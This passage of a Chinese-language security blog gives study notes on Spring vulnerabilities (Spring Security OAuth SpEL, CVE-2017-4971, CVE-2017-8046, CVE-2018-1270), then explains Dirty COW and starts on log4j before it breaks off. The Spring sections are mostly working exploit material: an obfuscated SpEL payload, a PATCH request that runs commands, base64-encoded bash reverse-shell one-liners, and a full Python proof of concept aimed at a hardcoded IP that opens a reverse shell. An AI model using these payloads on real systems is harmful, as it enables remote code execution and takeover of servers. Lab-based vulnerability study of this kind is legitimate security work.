class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">81</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">117</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">121</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">56</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">79</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">68</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">103</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">73</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">68</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">43</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">74</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">69</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">61</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">124</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">101</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">54</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">100</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">124</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>)))&#125;<br></code></pre></td></tr></table></figure><p>然后使用nc监听即可</p></blockquote><p>引发原因：Spring Security OAuth是为Spring框架提供安全认证支持的一个模块。在其使用 whitelabel views来处理错误时，由于使用 SpEL，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><h4 id="在是CVE-2017-4971"><a href="#在是CVE-2017-4971" class="headerlink" title="在是CVE-2017-4971"></a>在是<strong>CVE-2017-4971</strong></h4><p>以下内容是根据<a href="https://paper.seebug.org/322/%E5%BE%97%E6%9D%A5%E7%9A%84">https://paper.seebug.org/322/得来的</a></p><p>原理：</p><blockquote><p>首先我们看Spring Web Flow的这个类</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-2.png" alt="image-20220304172110759"></p><p>里面有这一行代码,是通过浏览器接收field然后进行SpringEL解析</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-3.png" alt="image-20220304172140273"></p></blockquote><p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-1.png" alt="image-20220304165837541"></p><h4 id="CVE-2017-8046"><a href="#CVE-2017-8046" class="headerlink" title="CVE-2017-8046"></a><strong>CVE-2017-8046</strong></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>202<br><br><span class="language-haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>vulhub<span class="hljs-string">&quot; &#125;]</span></span><br></code></pre></td></tr></table></figure><p>构造poc</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/ip/</span><span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwOS45Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br><br><span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-keyword">join</span>(map(str, (map(ord,<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwOS45Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>))))<br></code></pre></td></tr></table></figure><p><strong>CVE-2018-1270</strong></p><p>使用自带的POC即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><br>logging.basicConfig(stream=sys.stdout, level=logging.INFO)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">random_str</span>(<span class="hljs-params">length</span>):<br>    letters = string.ascii_lowercase + string.digits<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SockJS</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url, *args, **kwargs</span>):<br>        <span class="hljs-built_in">super</span>().__init__(*args, **kwargs)<br>        self.base = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/<span class="hljs-subst">&#123;random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)&#125;</span>/<span class="hljs-subst">&#123;random_str(<span class="hljs-number">8</span>)&#125;</span>&#x27;</span><br>        self.daemon = <span class="hljs-literal">True</span><br>        self.session = requests.session()<br>        self.session.headers = &#123;<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: url,<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br>        &#125;<br>        self.t = <span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.base&#125;</span>/htmlfile?c=_jp.vulhub&#x27;</span><br>        response = self.session.get(url, stream=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.iter_lines():<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, command, headers, body=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        data = [command.upper(), <span class="hljs-string">&#x27;\n&#x27;</span>]<br><br>        data.append(<span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;k&#125;</span>:<span class="hljs-subst">&#123;v&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> headers.items()]))<br><br>        data.append(<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>        data.append(body)<br>        data.append(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        data = json.dumps([<span class="hljs-string">&#x27;&#x27;</span>.join(data)])<br><br>        response = self.session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.base&#125;</span>/xhr_send?t=<span class="hljs-subst">&#123;self.t&#125;</span>&#x27;</span>, data=data)<br>        <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">204</span>:<br>            logging.info(<span class="hljs-string">f&quot;send &#x27;<span class="hljs-subst">&#123;command&#125;</span>&#x27; data error.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            logging.info(<span class="hljs-string">f&quot;send &#x27;<span class="hljs-subst">&#123;command&#125;</span>&#x27; data success.&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        self.session.close()<br><br><br>sockjs = SockJS(<span class="hljs-string">&#x27;http://175.24.4.26:8080/gs-guide-websocket&#x27;</span>)<span class="hljs-comment"># 这里修改ip</span><br>sockjs.start()<br>time.sleep(<span class="hljs-number">1</span>)<br><br>sockjs.send(<span class="hljs-string">&#x27;connect&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;accept-version&#x27;</span>: <span class="hljs-string">&#x27;1.1,1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;heart-beat&#x27;</span>: <span class="hljs-string">&#x27;10000,10000&#x27;</span><br>&#125;)<br><br><span class="hljs-comment">#这里修改命令</span><br>sockjs.send(<span class="hljs-string">&#x27;subscribe&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;selector&#x27;</span>: <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuNC4yNi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;sub-0&#x27;</span>,<br>    <span class="hljs-string">&#x27;destination&#x27;</span>: <span class="hljs-string">&#x27;/topic/greetings&#x27;</span><br>&#125;)<br><br>data = json.dumps(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;vulhub&#x27;</span>&#125;)<br>sockjs.send(<span class="hljs-string">&#x27;send&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;content-length&#x27;</span>: <span class="hljs-built_in">len</span>(data),<br>    <span class="hljs-string">&#x27;destination&#x27;</span>: <span class="hljs-string">&#x27;/app/hello&#x27;</span><br>&#125;, data)<br></code></pre></td></tr></table></figure><h4 id="防御方法-升级高版本即可"><a href="#防御方法-升级高版本即可" class="headerlink" title="防御方法:升级高版本即可"></a><strong>防御方法:升级高版本即可</strong></h4><h3 id="脏牛漏洞-Copy-On-Write-简称伪COW所以被称为脏牛"><a href="#脏牛漏洞-Copy-On-Write-简称伪COW所以被称为脏牛" class="headerlink" title="脏牛漏洞(Copy On Write 简称伪COW所以被称为脏牛)"></a>脏牛漏洞(Copy On Write 简称伪COW所以被称为脏牛)</h3><p>由于条件竞争导致越权</p><p>首先讲解一下<strong>原子性操作</strong></p><blockquote><p>从汇编层面能用一行机器码描述的就是原子性操作不能用一行机器码描述的就不是原子性操作</p></blockquote><p>例如a b 交换</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,a<br><span class="hljs-keyword">mov</span> a,b<br><span class="hljs-keyword">mov</span> b,<span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>从道理上面看上面的a和b交换没有任何问题,但是如果是多线程环境,a是一个全局变量并且在mov eax,a的过程中另一个线程调用了mov a,b并且又执行了其他的操作那就可能导致a的值并不是我们想要的</p><blockquote><p>只用一行c语言代码是伪原子性的,因为c语言的一行代码可能对应着汇编语言的多层代码</p></blockquote><p>例如:</p><blockquote><p>c语言代码:</p><p>int a &#x3D; (b*c)&lt;&lt;5;</p><p>汇编:</p><p>mov eax,b</p><p>mul eax,c</p><p>shl eax,5</p><p>mov a,eax</p></blockquote><p><strong>我们再来讲一下double checked locking if-condition(双重检查if条件锁)的问题</strong></p><p>它是用来对多线程的安全进行检查</p><p>初级版本的修复(如果更安全的调用构造函数)</p><p>如果存在一个类,有多个线程的多个函数都需要用到他的实例(COW页),并且在这些函数的整个函数过程都需要保证原子独占一个实例,我们会维护一张表(对应着内核的页表,用来记录所有指向该类的指针,且每个实例正常情况下只有一个指向它的指针)</p><p>如果该页表用光了在不了解double checked locking if-condition的情况下会这么写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br><br><span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>          helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>       &#125;<br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>&#125;<br>&#125;<br><br>**这里假设getInstance是用完页表需要重新分配一个页表的函数,暂时不写使用页表的函数**<br></code></pre></td></tr></table></figure><p>上面这种写法的危害</p><p>由于内核是多线程的如果没有加锁可能导致问题的出现</p><p>改版-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br><span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       lock();<span class="hljs-comment">//加锁</span><br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>          helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>       &#125;<br>       unlock();<span class="hljs-comment">//解锁</span><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样改,加锁的范围太大了,如果不需要if里面的操作他也会需要等待锁</p><p>改版-2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br><span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>       lock();<span class="hljs-comment">//加锁</span><br>           helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>      unlock();<span class="hljs-comment">//解锁</span><br>       &#125;<br><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种改版导致经典的线程问题(new 是伪原子的,大约三个操作)</p><p>改版-3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br><span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>       lock();<span class="hljs-comment">//加锁</span><br>           <span class="hljs-keyword">if</span>(helper == NULL)&#123;<br>             helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>             <span class="hljs-keyword">return</span> helper;<br>           &#125;<br>      unlock();<span class="hljs-comment">//解锁</span><br>       &#125;<br><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>经典解决方法,也是double checked lock if-condition方法</p><p>但是这种方法仍然不是最安全的,这也是脏牛利用这种不安全导致的</p><p>接下来回到脏牛的问题上面</p><p>首先理解一下<strong>私有版本(PRIVATE_COPY)</strong></p><p>将内存中一块缓存映射到硬盘中,但是如果读操作是对内存中的数据进行而不是对硬盘中的数据进行读</p><p>内存中的副本可以被任意写入,但是不允许被回写到硬盘中(这种操作类似于vim打开一个只读文件你可以写数据但是不能保存),<strong>所以只要能将内存中的数据写回那就能造成脏牛漏洞了</strong></p><p>当我们操作一个read-only的时候我们操作的是他的副本并不是原件</p><p>找找工作再看吧</p><blockquote><p><a href="https://www.bilibili.com/video/BV18Q4y1i7Ld?from=search&amp;seid=15043089374979084029&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV18Q4y1i7Ld?from=search&amp;seid=15043089374979084029&amp;spm_id_from=333.337.0.0</a></p></blockquote><h3 id="log4j原理研究"><a href="#log4j原理研究" class="headerlink" title="log4j原理研究"></a>log4j原理研究</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span 